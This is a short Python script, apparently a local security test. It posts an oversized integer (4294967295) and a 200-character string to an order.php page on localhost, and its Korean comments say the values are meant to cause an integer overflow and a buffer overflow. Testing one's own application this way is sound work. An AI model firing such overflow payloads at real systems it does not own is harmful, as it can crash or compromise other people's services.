import requests

url = "http://localhost/web/order.php"

payload = {
    "quantity": "4294967295",  # Integer Overflow 유발 값
    "special_request": "A" * 200  # BOF 발생 값
}

response = requests.post(url, data=payload)
print(response.text)
